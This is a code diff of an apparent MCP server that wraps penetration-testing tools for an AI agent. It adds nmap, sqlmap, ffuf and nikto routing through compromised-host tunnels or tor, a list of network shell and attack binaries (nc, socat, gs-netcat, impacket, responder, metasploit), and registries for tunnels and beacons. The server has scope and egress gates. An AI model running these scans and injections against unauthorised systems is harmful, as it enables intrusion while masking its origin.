@@ -3227,8 +3227,8 @@ var require_utils = __commonJS({
       }
       return ind;
     }
-    function removeDotSegments(path7) {
-      let input = path7;
+    function removeDotSegments(path10) {
+      let input = path10;
       const output = [];
       let nextSlash = -1;
       let len = 0;
@@ -3480,8 +3480,8 @@ var require_schemes = __commonJS({
         wsComponent.secure = void 0;
       }
       if (wsComponent.resourceName) {
-        const [path7, query] = wsComponent.resourceName.split("?");
-        wsComponent.path = path7 && path7 !== "/" ? path7 : void 0;
+        const [path10, query] = wsComponent.resourceName.split("?");
+        wsComponent.path = path10 && path10 !== "/" ? path10 : void 0;
         wsComponent.query = query;
         wsComponent.resourceName = void 0;
       }
@@ -4339,7 +4339,7 @@ var require_core = __commonJS({
       errorsText(errors = this.errors, { separator = ", ", dataVar = "data" } = {}) {
         if (!errors || errors.length === 0)
           return "No errors";
-        return errors.map((e) => `${dataVar}${e.instancePath} ${e.message}`).reduce((text9, msg) => text9 + separator + msg);
+        return errors.map((e) => `${dataVar}${e.instancePath} ${e.message}`).reduce((text13, msg) => text13 + separator + msg);
       }
       $dataMetaSchema(metaSchema, keywordsJsonPointers) {
         const rules = this.RULES.all;
@@ -6900,12 +6900,12 @@ var require_dist = __commonJS({
         throw new Error(`Unknown format "${name}"`);
       return f;
     };
-    function addFormats(ajv, list, fs5, exportName) {
+    function addFormats(ajv, list, fs8, exportName) {
       var _a3;
       var _b;
       (_a3 = (_b = ajv.opts.code).formats) !== null && _a3 !== void 0 ? _a3 : _b.formats = (0, codegen_1._)`require("ajv-formats/dist/formats").${exportName}`;
       for (const f of list)
-        ajv.addFormat(f, fs5[f]);
+        ajv.addFormat(f, fs8[f]);
     }
     module.exports = exports = formatsPlugin;
     Object.defineProperty(exports, "__esModule", { value: true });
@@ -7272,8 +7272,8 @@ function getErrorMap() {
 
 // node_modules/zod/v3/helpers/parseUtil.js
 var makeIssue = (params) => {
-  const { data, path: path7, errorMaps, issueData } = params;
-  const fullPath = [...path7, ...issueData.path || []];
+  const { data, path: path10, errorMaps, issueData } = params;
+  const fullPath = [...path10, ...issueData.path || []];
   const fullIssue = {
     ...issueData,
     path: fullPath
@@ -7388,11 +7388,11 @@ var errorUtil;
 
 // node_modules/zod/v3/types.js
 var ParseInputLazyPath = class {
-  constructor(parent, value, path7, key) {
+  constructor(parent, value, path10, key) {
     this._cachedPath = [];
     this.parent = parent;
     this.data = value;
-    this._path = path7;
+    this._path = path10;
     this._key = key;
   }
   get path() {
@@ -11313,10 +11313,10 @@ function mergeDefs(...defs) {
 function cloneDef(schema) {
   return mergeDefs(schema._zod.def);
 }
-function getElementAtPath(obj, path7) {
-  if (!path7)
+function getElementAtPath(obj, path10) {
+  if (!path10)
     return obj;
-  return path7.reduce((acc, key) => acc?.[key], obj);
+  return path10.reduce((acc, key) => acc?.[key], obj);
 }
 function promiseAllObject(promisesObj) {
   const keys = Object.keys(promisesObj);
@@ -11725,11 +11725,11 @@ function explicitlyAborted(x, startIndex = 0) {
   }
   return false;
 }
-function prefixIssues(path7, issues) {
+function prefixIssues(path10, issues) {
   return issues.map((iss) => {
     var _a3;
     (_a3 = iss).path ?? (_a3.path = []);
-    iss.path.unshift(path7);
+    iss.path.unshift(path10);
     return iss;
   });
 }
@@ -11876,16 +11876,16 @@ function flattenError(error51, mapper = (issue2) => issue2.message) {
 }
 function formatError(error51, mapper = (issue2) => issue2.message) {
   const fieldErrors = { _errors: [] };
-  const processError = (error52, path7 = []) => {
+  const processError = (error52, path10 = []) => {
     for (const issue2 of error52.issues) {
       if (issue2.code === "invalid_union" && issue2.errors.length) {
-        issue2.errors.map((issues) => processError({ issues }, [...path7, ...issue2.path]));
+        issue2.errors.map((issues) => processError({ issues }, [...path10, ...issue2.path]));
       } else if (issue2.code === "invalid_key") {
-        processError({ issues: issue2.issues }, [...path7, ...issue2.path]);
+        processError({ issues: issue2.issues }, [...path10, ...issue2.path]);
       } else if (issue2.code === "invalid_element") {
-        processError({ issues: issue2.issues }, [...path7, ...issue2.path]);
+        processError({ issues: issue2.issues }, [...path10, ...issue2.path]);
       } else {
-        const fullpath = [...path7, ...issue2.path];
+        const fullpath = [...path10, ...issue2.path];
         if (fullpath.length === 0) {
           fieldErrors._errors.push(mapper(issue2));
         } else {
@@ -11912,17 +11912,17 @@ function formatError(error51, mapper = (issue2) => issue2.message) {
 }
 function treeifyError(error51, mapper = (issue2) => issue2.message) {
   const result = { errors: [] };
-  const processError = (error52, path7 = []) => {
+  const processError = (error52, path10 = []) => {
     var _a3, _b;
     for (const issue2 of error52.issues) {
       if (issue2.code === "invalid_union" && issue2.errors.length) {
-        issue2.errors.map((issues) => processError({ issues }, [...path7, ...issue2.path]));
+        issue2.errors.map((issues) => processError({ issues }, [...path10, ...issue2.path]));
       } else if (issue2.code === "invalid_key") {
-        processError({ issues: issue2.issues }, [...path7, ...issue2.path]);
+        processError({ issues: issue2.issues }, [...path10, ...issue2.path]);
       } else if (issue2.code === "invalid_element") {
-        processError({ issues: issue2.issues }, [...path7, ...issue2.path]);
+        processError({ issues: issue2.issues }, [...path10, ...issue2.path]);
       } else {
-        const fullpath = [...path7, ...issue2.path];
+        const fullpath = [...path10, ...issue2.path];
         if (fullpath.length === 0) {
           result.errors.push(mapper(issue2));
           continue;
@@ -11954,8 +11954,8 @@ function treeifyError(error51, mapper = (issue2) => issue2.message) {
 }
 function toDotPath(_path) {
   const segs = [];
-  const path7 = _path.map((seg) => typeof seg === "object" ? seg.key : seg);
-  for (const seg of path7) {
+  const path10 = _path.map((seg) => typeof seg === "object" ? seg.key : seg);
+  for (const seg of path10) {
     if (typeof seg === "number")
       segs.push(`[${seg}]`);
     else if (typeof seg === "symbol")
@@ -18185,8 +18185,8 @@ function ko_default() {
 }
 
 // node_modules/zod/v4/locales/lt.js
-var capitalizeFirstCharacter = (text9) => {
-  return text9.charAt(0).toUpperCase() + text9.slice(1);
+var capitalizeFirstCharacter = (text13) => {
+  return text13.charAt(0).toUpperCase() + text13.slice(1);
 };
 function getUnitTypeFromNumber(number4) {
   const abs = Math.abs(number4);
@@ -23067,11 +23067,11 @@ function normalizeObjectSchema(schema) {
   }
   return void 0;
 }
-function getDotPath(path7) {
-  if (path7.length === 0) {
+function getDotPath(path10) {
+  if (path10.length === 0) {
     return "object root";
   }
-  return path7.reduce((acc, seg, index) => {
+  return path10.reduce((acc, seg, index) => {
     if (index === 0) {
       return String(seg);
     }
@@ -25096,13 +25096,13 @@ function resolveRef(ref, ctx) {
   if (!ref.startsWith("#")) {
     throw new Error("External $ref is not supported, only local refs (#/...) are allowed");
   }
-  const path7 = ref.slice(1).split("/").filter(Boolean);
-  if (path7.length === 0) {
+  const path10 = ref.slice(1).split("/").filter(Boolean);
+  if (path10.length === 0) {
     return ctx.rootSchema;
   }
   const defsKey = ctx.version === "draft-2020-12" ? "$defs" : "definitions";
-  if (path7[0] === defsKey) {
-    const key = path7[1];
+  if (path10[0] === defsKey) {
+    const key = path10[1];
     if (!key || !ctx.defs[key]) {
       throw new Error(`Reference not found: ${ref}`);
     }
@@ -31263,11 +31263,57 @@ var TOOL_MAP = {
   tshark: ["tshark", "wireshark"],
   nc: ["netcat-openbsd", "netcat"],
   socat: ["socat", "socat"],
+  ssh: ["openssh-client", "openssh"],
+  sshpass: ["sshpass", "sshpass"],
+  proxychains4: ["proxychains4", "proxychains-ng"],
+  tor: ["tor", "tor"],
+  "gs-netcat": ["gsocket (static build via cobrashell `bin gs-netcat`)", "gsocket"],
   python3: ["python3", "python3"],
   curl: ["curl", "curl"],
   wget: ["wget", "wget"],
   perl: ["perl", "perl"],
-  git: ["git", "git"]
+  git: ["git", "git"],
+  /* --- profile binaries (Phase 6): probed so profile_check can report --- */
+  bettercap: ["bettercap (profile: wireless)", "bettercap"],
+  hcxdumptool: ["hcxdumptool (profile: wireless)", "hcxdumptool"],
+  reaver: ["reaver (profile: wireless)", "reaver"],
+  bully: ["bully (profile: wireless)", "bully"],
+  kismet: ["kismet (profile: wireless)", "kismet"],
+  airodump: ["aircrack-ng (profile: wireless)", "aircrack-ng"],
+  impacket: ["python3-impacket + impacket-scripts (profile: ad)", "impacket"],
+  responder: ["responder (profile: ad)", "responder"],
+  netexec: ["netexec (profile: ad)", "netexec"],
+  nxc: ["netexec (profile: ad)", "netexec"],
+  bloodhound: ["bloodhound.py (profile: ad)", "bloodhound"],
+  msfconsole: ["metasploit-framework (profile: exploit)", "metasploit"],
+  wpscan: ["wpscan (profile: webplus)", "wpscan"],
+  mitmproxy: ["mitmproxy (profile: webplus)", "mitmproxy"]
+};
+var PROFILE_MAP = {
+  wireless: {
+    desc: "Wireless assessment (802.11 + WPS)",
+    binaries: ["bettercap", "hcxdumptool", "reaver", "bully", "kismet", "airodump"],
+    packages: "bettercap hcxtools hcxdumptool reaver bully kismet aircrack-ng",
+    note: "Needs a wireless adapter + monitor mode; usually run on the operator box, not the target."
+  },
+  ad: {
+    desc: "Active Directory (impacket, responder, netexec, bloodhound)",
+    binaries: ["impacket", "responder", "netexec", "nxc", "bloodhound"],
+    packages: "python3-impacket impacket-scripts responder netexec bloodhound.py",
+    note: "Scope-gate every DC/KDC target; responder/netexec are LOUD on the wire."
+  },
+  exploit: {
+    desc: "Metasploit framework (msfconsole)",
+    binaries: ["msfconsole"],
+    packages: "metasploit-framework",
+    note: "searchsploit/exploitdb is CORE (offline); this profile adds msf only. Heavy."
+  },
+  webplus: {
+    desc: "Web extras (wpscan, mitmproxy, seclists)",
+    binaries: ["wpscan", "mitmproxy"],
+    packages: "mitmproxy ffuf seclists wpscan php-cli",
+    note: "ffuf is already core; this adds wpscan + mitmproxy (TTY proxy) + seclists wordlists."
+  }
 };
 var cache = null;
 async function which(binary) {
@@ -31290,6 +31336,9 @@ async function probeCapabilities() {
 }
 function getCapabilities() {
   return cache ?? [];
+}
+function hasCapability(binary) {
+  return (cache ?? []).some((c) => c.binary === binary && c.present);
 }
 function capabilityPath(binary) {
   const c = (cache ?? []).find((c2) => c2.binary === binary && c2.present);
@@ -31317,15 +31366,73 @@ function capabilitiesMarkdown() {
     ...rows
   ].join("\n");
 }
+function probeProfiles() {
+  return Object.entries(PROFILE_MAP).map(([name, p]) => {
+    const installed = p.binaries.filter((b) => hasCapability(b));
+    const missing = p.binaries.filter((b) => !hasCapability(b));
+    return {
+      name,
+      desc: p.desc,
+      packages: p.packages,
+      note: p.note,
+      installed,
+      missing,
+      partial: installed.length > 0,
+      full: missing.length === 0
+    };
+  });
+}
+function profileStatus(name) {
+  return probeProfiles().find((p) => p.name === name);
+}
+function profilesMarkdown() {
+  const rows = probeProfiles().map((p) => `| ${p.name} | ${p.full ? "\u2705 full" : p.partial ? "\u{1F7E1} partial" : "\u274C absent"} | ${p.installed.join(", ") || "\u2014"} | ${p.missing.join(", ") || "\u2014"} |`);
+  return [
+    "",
+    "## COBRA_PROFILES (OS tool groups)",
+    "",
+    "| Profile | Status | Installed | Missing |",
+    "|---|---|---|---|",
+    ...rows,
+    "",
+    '_Rebuild the OS with `COBRA_PROFILES=\\"<name>\\"` to add a missing group. Profiles are never auto-installed._'
+  ].join("\n");
+}
 
 // build/state.js
 var activeTarget = null;
+var targets = [];
 var sessions = /* @__PURE__ */ new Map();
+var sessionCounter = 0;
 function setTarget(t) {
   activeTarget = t;
+  const i = targets.indexOf(t);
+  if (i !== -1)
+    targets.splice(i, 1);
+  targets.unshift(t);
 }
 function getTarget() {
   return activeTarget;
+}
+function listTargets() {
+  return [...targets];
+}
+function removeTarget(t) {
+  const i = targets.indexOf(t);
+  if (i === -1)
+    return false;
+  targets.splice(i, 1);
+  if (activeTarget === t)
+    activeTarget = targets[0] ?? null;
+  return true;
+}
+function clearTargets() {
+  targets.length = 0;
+  activeTarget = null;
+}
+function nextSessionId(kind) {
+  sessionCounter += 1;
+  return `${kind}-${Date.now().toString(36)}-${sessionCounter}`;
 }
 function registerSession(s) {
   sessions.set(s.id, s);
@@ -31338,6 +31445,32 @@ function removeSession(id) {
 }
 function listSessions() {
   return [...sessions.values()];
+}
+var tunnels = /* @__PURE__ */ new Map();
+function registerTunnel(t) {
+  tunnels.set(t.id, t);
+}
+function getTunnel(id) {
+  if (id)
+    return tunnels.get(id);
+  const all = [...tunnels.values()];
+  return all.length > 0 ? all[all.length - 1] : void 0;
+}
+function removeTunnel(id) {
+  return tunnels.delete(id);
+}
+function listTunnels() {
+  return [...tunnels.values()];
+}
+var beacons = /* @__PURE__ */ new Map();
+function registerBeacon(b) {
+  beacons.set(b.id, b);
+}
+function getBeacon(id) {
+  return beacons.get(id);
+}
+function listBeacons() {
+  return [...beacons.values()];
 }
 
 // build/config.js
@@ -31361,7 +31494,11 @@ function loadConfig() {
     // Installed COBRA OS images set COBRA_REPO_ROOT=/etc/cobra (the bundle lives
     // in /etc/cobra, so the derived default would be "/" — scripts/ + BUILD_PLAN
     // lookups would break).
-    repoRoot: process.env.COBRA_REPO_ROOT ?? REPO_ROOT
+    repoRoot: process.env.COBRA_REPO_ROOT ?? REPO_ROOT,
+    enableTunnels: envBool("COBRA_ENABLE_TUNNELS", false),
+    enableShell: envBool("COBRA_ENABLE_SHELL", false),
+    enableProxy: envBool("COBRA_ENABLE_PROXY", false),
+    proxyUrl: process.env.COBRA_PROXY ?? "socks5h://127.0.0.1:9050"
   };
 }
 var CONFIG = loadConfig();
@@ -31400,6 +31537,8 @@ function parseScope(raw) {
       out.push({ kind: "cidr", raw: t, base, bits, prefix });
     } else if (ipToBigInt(t) !== null) {
       out.push({ kind: "ip", raw: t, base: ipToBigInt(t) });
+    } else if (t.toLowerCase() === ".onion") {
+      out.push({ kind: "onion", raw: t.toLowerCase() });
     } else {
       out.push({ kind: "domain", raw: t.toLowerCase() });
     }
@@ -31434,6 +31573,8 @@ function inScope(target) {
     }
     if (e.kind === "domain" && domainMatches(target, e.raw))
       return true;
+    if (e.kind === "onion" && target.toLowerCase().endsWith(".onion"))
+      return true;
   }
   return false;
 }
@@ -31461,6 +31602,23 @@ function registerSessionTools(server) {
   });
   server.tool("target_get", "Get the currently active engagement target.", {}, async () => text(getTarget() ? `\u{1F3AF} Active target: ${getTarget()}` : "No target set. Use target_set first."));
   server.tool("loot_path", "Get the directory where all tool output (loot) is written.", {}, async () => text(`\u{1F4C1} Loot directory: ${CONFIG.lootDir}`));
+  server.tool("target_list", "List all registered engagement targets (most-recent-first), marking the active one. Concurrent targets are first-class \u2014 recon on one doesn't clobber another.", {}, async () => {
+    const ts = listTargets();
+    if (ts.length === 0)
+      return text("No targets registered. Use target_set first.");
+    const active = getTarget();
+    const rows = ts.map((t) => `- ${t}${t === active ? "  \u{1F3AF} (active)" : ""}`);
+    return text(`## Targets (${ts.length})
+
+` + rows.join("\n"));
+  });
+  server.tool("target_clear", "Remove a target from the registry (or all with no argument). Clears the active target if it was removed.", { target: external_exports.string().optional().describe("Target to remove; omit to clear all") }, async ({ target }) => {
+    if (target === void 0) {
+      clearTargets();
+      return text("\u{1F3AF} All targets cleared.");
+    }
+    return text(removeTarget(target) ? `\u{1F3AF} Removed target: ${target}` : `No such target registered: ${target}`);
+  });
 }
 
 // build/lib/exec.js
@@ -31490,7 +31648,10 @@ function runToLoot(tool, argv, opts = {}) {
   return new Promise((resolve, reject) => {
     if (argv.length === 0)
       return reject(new Error("empty argv"));
-    const child = spawn(argv[0], argv.slice(1), { stdio: ["ignore", "pipe", "pipe"] });
+    const child = spawn(argv[0], argv.slice(1), {
+      stdio: ["ignore", "pipe", "pipe"],
+      env: opts.env ? { ...process.env, ...opts.env } : process.env
+    });
     const out = fs.createWriteStream(file2, { flags: "a" });
     let captured = "";
     child.stdout.on("data", (d) => {
@@ -31525,6 +31686,66 @@ function runToLoot(tool, argv, opts = {}) {
     });
   });
 }
+function proxyPrefix(via) {
+  if (via === void 0 || via === null || via === "") {
+    if (via === "") {
+    } else {
+      return [];
+    }
+  }
+  if (!CONFIG.enableTunnels) {
+    throw new Error("TUNNELS DISABLED: `via` routing needs COBRA_ENABLE_TUNNELS=1 on the server (the cobra-ops xint equivalent). Restart the server with it set.");
+  }
+  const t = getTunnel(via === "" ? void 0 : via);
+  if (!t) {
+    throw new Error(via ? `no such tunnel: ${via} \u2014 start one with tunnel_socks_start (or check tunnel_list).` : "no active tunnels \u2014 start one with tunnel_socks_start first.");
+  }
+  const pc = capabilityPath("proxychains4");
+  if (!pc) {
+    throw new Error("MISSING TOOL: 'proxychains4' not found on this box. Install with: apt install proxychains4");
+  }
+  fs.mkdirSync(CONFIG.lootDir, { recursive: true });
+  const conf = path2.join(CONFIG.lootDir, `proxychains-${t.id}.conf`);
+  fs.writeFileSync(conf, ["[ProxyList]", `${t.socksVersion === 4 ? "socks4" : "socks5"} 127.0.0.1 ${t.port}`, ""].join("\n"), { mode: 384 });
+  return [pc, "-f", conf, "-q"];
+}
+var TOR_GATE_OFF = "TOR PROXY DISABLED: set COBRA_ENABLE_PROXY=1 on the server and restart. Own gate \u2014 exit-node egress is an independent axis from COBRA_ALLOW_INTERNET.";
+var ONION_NEEDS_TOR = "ONION ROUTING REQUIRED: this target is a .onion. Re-run with tor=1 (and set COBRA_ENABLE_PROXY=1 on the server). Refusing \u2014 .onion is not directly routable.";
+function torPrefix() {
+  if (!CONFIG.enableProxy) {
+    throw new Error(TOR_GATE_OFF);
+  }
+  const pc = capabilityPath("proxychains4");
+  if (!pc) {
+    throw new Error("MISSING TOOL: 'proxychains4' not found on this box. Install with: apt install proxychains4");
+  }
+  const m = CONFIG.proxyUrl.match(/^socks5h?:\/\/([^:/]+):(\d+)$/);
+  if (!m) {
+    throw new Error(`COBRA_PROXY must be socks5h://host:port (got "${CONFIG.proxyUrl}") \u2014 proxychains4 needs a host:port.`);
+  }
+  fs.mkdirSync(CONFIG.lootDir, { recursive: true });
+  const conf = path2.join(CONFIG.lootDir, "proxychains-tor.conf");
+  fs.writeFileSync(conf, ["[ProxyList]", `socks5 ${m[1]} ${m[2]}`, ""].join("\n"), { mode: 384 });
+  return [pc, "-f", conf, "-q"];
+}
+function resolveExecPrefix(opts) {
+  if (opts.tor && opts.via !== void 0 && opts.via !== "") {
+    throw new Error("tor=1 and via=<tunnel> are mutually exclusive \u2014 pick one route.");
+  }
+  if (opts.tor)
+    return torPrefix();
+  return proxyPrefix(opts.via);
+}
+function assertNotUnroutedOnion(targetOrUrl, tor) {
+  let host = targetOrUrl;
+  try {
+    host = new URL(targetOrUrl).hostname;
+  } catch {
+  }
+  if (host.toLowerCase().endsWith(".onion") && !tor) {
+    throw new Error(ONION_NEEDS_TOR);
+  }
+}
 function resultText(tool, r) {
   return [
     `## ${tool} \u2014 exit ${r.exitCode} in ${(r.durationMs / 1e3).toFixed(1)}s`,
@@ -31539,40 +31760,60 @@ function resultText(tool, r) {
 function text2(s) {
   return { content: [{ type: "text", text: s }] };
 }
-function resolveTarget(t) {
+function assertEgressOk(tool, tor) {
+  if (tor)
+    return;
+  if (!CONFIG.allowInternet) {
+    throw new Error(`EGRESS DENIED: ${tool} reaches the public internet (not just the in-scope target). Set COBRA_ALLOW_INTERNET=1, or route through tor (tor=1 + COBRA_ENABLE_PROXY=1).`);
+  }
+}
+function resolveTarget(t, tor) {
   const target = t ?? getTarget();
   if (!target)
     throw new Error("No target. Pass one explicitly or target_set first.");
+  assertNotUnroutedOnion(target, tor);
   assertInScope(target);
   return target;
 }
 function registerReconTools(server) {
   const targetArg = { target: external_exports.string().optional().describe("Target IP/host (defaults to active target)") };
-  server.tool("recon_fast_scan", "Fast nmap scan (top ports, -T4 -F). Cheap first look. Output to loot file.", targetArg, async ({ target }) => {
-    const t = resolveTarget(target);
+  const viaArg2 = {
+    via: external_exports.string().optional().describe("Tunnel id from tunnel_socks_start \u2014 route through that foothold via proxychains. Omit for direct."),
+    tor: external_exports.boolean().optional().describe("true = route through the system tor daemon (COBRA_PROXY, COBRA_ENABLE_PROXY=1). Required for .onion targets. Mutually exclusive with via.")
+  };
+  server.tool("recon_fast_scan", "Fast nmap scan (top ports, -T4 -F). Cheap first look. Output to loot file.", { ...targetArg, ...viaArg2 }, async ({ target, via, tor }) => {
+    const t = resolveTarget(target, tor);
     const nmap = requireCapability("nmap");
-    const r = await runToLoot("recon_fast_scan", [nmap, "-n", "-Pn", "-T4", "-F", "--open", t]);
+    const prefix = resolveExecPrefix({ via, tor });
+    const r = await runToLoot("recon_fast_scan", [...prefix, nmap, "-n", "-Pn", "-T4", "-F", "--open", t]);
     return text2(resultText("recon_fast_scan", r));
   });
-  server.tool("recon_full_scan", "Full TCP port scan (nmap -p-). Slower but complete. Output to loot file.", targetArg, async ({ target }) => {
-    const t = resolveTarget(target);
+  server.tool("recon_full_scan", "Full TCP port scan (nmap -p-). Slower but complete. Output to loot file.", { ...targetArg, ...viaArg2 }, async ({ target, via, tor }) => {
+    const t = resolveTarget(target, tor);
     const nmap = requireCapability("nmap");
-    const r = await runToLoot("recon_full_scan", [nmap, "-n", "-Pn", "-p-", "--open", "-T4", t], { timeoutMs: 30 * 60 * 1e3 });
+    const prefix = resolveExecPrefix({ via, tor });
+    const r = await runToLoot("recon_full_scan", [...prefix, nmap, "-n", "-Pn", "-p-", "--open", "-T4", t], { timeoutMs: 45 * 60 * 1e3 });
     return text2(resultText("recon_full_scan", r));
   });
-  server.tool("recon_service_scan", "Service/version detection (nmap -sV -sC). Run against discovered ports. Output to loot file.", { ports: external_exports.string().describe("Comma-separated ports, e.g. '22,80,443'"), ...targetArg }, async ({ ports, target }) => {
-    const t = resolveTarget(target);
+  server.tool("recon_service_scan", "Service/version detection (nmap -sV -sC). Run against discovered ports. Output to loot file.", { ports: external_exports.string().describe("Comma-separated ports, e.g. '22,80,443'"), ...targetArg, ...viaArg2 }, async ({ ports, target, via, tor }) => {
+    const t = resolveTarget(target, tor);
     const nmap = requireCapability("nmap");
-    const r = await runToLoot("recon_service_scan", [nmap, "-n", "-Pn", "-sV", "-sC", "-p", ports, t], { timeoutMs: 20 * 60 * 1e3 });
+    const prefix = resolveExecPrefix({ via, tor });
+    const r = await runToLoot("recon_service_scan", [...prefix, nmap, "-n", "-Pn", "-sV", "-sC", "-p", ports, t], { timeoutMs: 20 * 60 * 1e3 });
     return text2(resultText("recon_service_scan", r));
   });
-  server.tool("recon_vuln_scan", "\u26A0\uFE0F SLOW + NOISY. nmap vulners script. Confirm the mission allows noise. Output to loot file.", targetArg, async ({ target }) => {
-    const t = resolveTarget(target);
+  server.tool("recon_vuln_scan", "\u26A0\uFE0F SLOW + NOISY. nmap vulners script. Confirm the mission allows noise. Output to loot file.", { ...targetArg, ...viaArg2 }, async ({ target, via, tor }) => {
+    const t = resolveTarget(target, tor);
+    assertEgressOk("recon_vuln_scan", tor);
     const nmap = requireCapability("nmap");
-    const r = await runToLoot("recon_vuln_scan", [nmap, "-Pn", "-sV", "--script", "vulners.nse", t], { timeoutMs: 30 * 60 * 1e3 });
+    const prefix = resolveExecPrefix({ via, tor });
+    const r = await runToLoot("recon_vuln_scan", [...prefix, nmap, "-Pn", "-sV", "--script", "vulners.nse", t], { timeoutMs: 30 * 60 * 1e3 });
     return text2(resultText("recon_vuln_scan", r));
   });
-  server.tool("recon_udp_scan", "UDP scan (top 100 UDP ports). Requires sudo/root. Output to loot file.", targetArg, async ({ target }) => {
+  server.tool("recon_udp_scan", "UDP scan (top 100 UDP ports). Requires sudo/root. Direct only \u2014 SOCKS tunnels carry TCP, so `via` is refused here. Output to loot file.", { ...targetArg, ...viaArg2 }, async ({ target, via, tor }) => {
+    if (via !== void 0 || tor) {
+      throw new Error("recon_udp_scan is direct-only: SOCKS tunnels and tor carry TCP, UDP can't ride them.");
+    }
     const t = resolveTarget(target);
     const nmap = requireCapability("nmap");
     const r = await runToLoot("recon_udp_scan", [nmap, "-n", "-Pn", "-sU", "--top-ports", "100", "--open", t], { timeoutMs: 30 * 60 * 1e3 });
@@ -31584,16 +31825,23 @@ function registerReconTools(server) {
     const r = await runToLoot("recon_dns", [dig, name, "any"]);
     return text2(resultText("recon_dns", r));
   });
-  server.tool("recon_whois", "WHOIS lookup. Output to loot file.", { target: external_exports.string().describe("IP or domain") }, async ({ target }) => {
+  server.tool("recon_whois", "WHOIS lookup. Reaches public whois servers \u2014 egress-gated (COBRA_ALLOW_INTERNET=1 or tor=1). Output to loot file.", {
+    target: external_exports.string().describe("IP or domain"),
+    tor: external_exports.boolean().optional().describe("true = route through the system tor daemon (COBRA_PROXY, COBRA_ENABLE_PROXY=1). Satisfies the egress gate.")
+  }, async ({ target, tor }) => {
+    assertNotUnroutedOnion(target, tor);
     assertInScope(target);
+    assertEgressOk("recon_whois", tor);
     const whois = requireCapability("whois");
-    const r = await runToLoot("recon_whois", [whois, target]);
+    const prefix = resolveExecPrefix({ tor });
+    const r = await runToLoot("recon_whois", [...prefix, whois, target]);
     return text2(resultText("recon_whois", r));
   });
-  server.tool("recon_smb_enum", "SMB enumeration (nmap smb NSE: OS, shares, users). Output to loot file.", targetArg, async ({ target }) => {
-    const t = resolveTarget(target);
+  server.tool("recon_smb_enum", "SMB enumeration (nmap smb NSE: OS, shares, users). Output to loot file.", { ...targetArg, ...viaArg2 }, async ({ target, via, tor }) => {
+    const t = resolveTarget(target, tor);
     const nmap = requireCapability("nmap");
-    const r = await runToLoot("recon_smb_enum", [nmap, "-n", "-Pn", "-p445", "--script", "smb-os-discovery,smb-enum-shares,smb-enum-users", t]);
+    const prefix = resolveExecPrefix({ via, tor });
+    const r = await runToLoot("recon_smb_enum", [...prefix, nmap, "-n", "-Pn", "-p445", "--script", "smb-os-discovery,smb-enum-shares,smb-enum-users", t]);
     return text2(resultText("recon_smb_enum", r));
   });
 }
@@ -31609,36 +31857,48 @@ function hostFromUrl(url2) {
     throw new Error(`invalid URL: ${url2}`);
   }
 }
+var viaArg = {
+  via: external_exports.string().optional().describe("Tunnel id from tunnel_socks_start \u2014 route through that foothold via proxychains. Omit for direct."),
+  tor: external_exports.boolean().optional().describe("true = route through the system tor daemon (COBRA_PROXY, COBRA_ENABLE_PROXY=1). Required for .onion targets. Mutually exclusive with via.")
+};
 function registerWebTools(server) {
   server.tool("web_dir_brute", "Directory brute force (ffuf, fallback gobuster). Finds hidden paths. Output to loot file.", {
     url: external_exports.string().describe("Base URL, e.g. http://target/"),
-    wordlist: external_exports.string().optional().describe("Wordlist path (default: common.txt if present)")
-  }, async ({ url: url2, wordlist }) => {
+    wordlist: external_exports.string().optional().describe("Wordlist path (default: common.txt if present)"),
+    ...viaArg
+  }, async ({ url: url2, wordlist, via, tor }) => {
+    assertNotUnroutedOnion(url2, tor);
     assertInScope(hostFromUrl(url2));
+    const prefix = resolveExecPrefix({ via, tor });
     const wl = wordlist ?? "/usr/share/wordlists/dirb/common.txt";
     const ffuf = capabilityPath("ffuf");
     if (ffuf) {
-      const r2 = await runToLoot("web_dir_brute", [ffuf, "-u", `${url2.replace(/\/$/, "")}/FUZZ`, "-w", wl, "-mc", "200,204,301,302,307,401,403"], { timeoutMs: 30 * 60 * 1e3 });
+      const r2 = await runToLoot("web_dir_brute", [...prefix, ffuf, "-u", `${url2.replace(/\/$/, "")}/FUZZ`, "-w", wl, "-mc", "200,204,301,302,307,401,403"], { timeoutMs: 30 * 60 * 1e3 });
       return text3(resultText("web_dir_brute", r2));
     }
     const gobuster = requireCapability("gobuster");
-    const r = await runToLoot("web_dir_brute", [gobuster, "dir", "-u", url2, "-w", wl, "-q"], { timeoutMs: 30 * 60 * 1e3 });
+    const r = await runToLoot("web_dir_brute", [...prefix, gobuster, "dir", "-u", url2, "-w", wl, "-q"], { timeoutMs: 30 * 60 * 1e3 });
     return text3(resultText("web_dir_brute", r));
   });
-  server.tool("web_vuln_scan", "\u26A0\uFE0F NOISY. nikto web vulnerability scan. Output to loot file.", { url: external_exports.string().describe("Target URL") }, async ({ url: url2 }) => {
+  server.tool("web_vuln_scan", "\u26A0\uFE0F NOISY. nikto web vulnerability scan. Output to loot file.", { url: external_exports.string().describe("Target URL"), ...viaArg }, async ({ url: url2, via, tor }) => {
+    assertNotUnroutedOnion(url2, tor);
     assertInScope(hostFromUrl(url2));
+    const prefix = resolveExecPrefix({ via, tor });
     const nikto = requireCapability("nikto");
-    const r = await runToLoot("web_vuln_scan", [nikto, "-h", url2], { timeoutMs: 30 * 60 * 1e3 });
+    const r = await runToLoot("web_vuln_scan", [...prefix, nikto, "-h", url2], { timeoutMs: 30 * 60 * 1e3 });
     return text3(resultText("web_vuln_scan", r));
   });
   server.tool("web_sql_inject", "SQL injection (sqlmap --batch). Provide a URL with an injectable parameter. Output to loot file.", {
     url: external_exports.string().describe("URL with parameter, e.g. http://target/item.php?id=1"),
     level: external_exports.string().optional().describe("sqlmap --level (1-5, default 1)"),
-    risk: external_exports.string().optional().describe("sqlmap --risk (1-3, default 1)")
-  }, async ({ url: url2, level, risk }) => {
+    risk: external_exports.string().optional().describe("sqlmap --risk (1-3, default 1)"),
+    ...viaArg
+  }, async ({ url: url2, level, risk, via, tor }) => {
+    assertNotUnroutedOnion(url2, tor);
     assertInScope(hostFromUrl(url2));
+    const prefix = resolveExecPrefix({ via, tor });
     const sqlmap = requireCapability("sqlmap");
-    const r = await runToLoot("web_sql_inject", [sqlmap, "-u", url2, "--batch", "--level", level ?? "1", "--risk", risk ?? "1", "--output-dir", "/tmp/sqlmap-out"], { timeoutMs: 45 * 60 * 1e3 });
+    const r = await runToLoot("web_sql_inject", [...prefix, sqlmap, "-u", url2, "--batch", "--level", level ?? "1", "--risk", risk ?? "1", "--output-dir", "/tmp/sqlmap-out"], { timeoutMs: 45 * 60 * 1e3 });
     return text3(resultText("web_sql_inject", r));
   });
 }
@@ -31653,11 +31913,15 @@ function registerCredsTools(server) {
